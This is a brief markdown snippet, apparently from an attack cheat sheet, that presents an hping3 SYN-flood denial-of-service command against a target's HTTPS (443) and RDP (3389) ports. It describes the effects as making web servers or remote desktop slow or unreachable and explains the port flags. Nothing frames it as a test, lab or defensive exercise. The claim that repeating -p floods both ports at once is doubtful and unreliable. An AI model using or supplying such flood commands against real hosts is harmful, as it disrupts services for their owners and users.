
# Multi-Port Attack

## Effects:
- If RDP or a Web Server is enabled, they may become slow or inaccessible.
- Remote login may fail if RDP is overwhelmed.

## Command:
```bash
sudo hping3 -S --flood -p 443 -p 3389 <Target IP>
```

## Explanation:

- `-p 443` → Attacks HTTPS (Web Traffic) port.
- `-p 3389` → Attacks RDP (Remote Desktop Protocol) port.
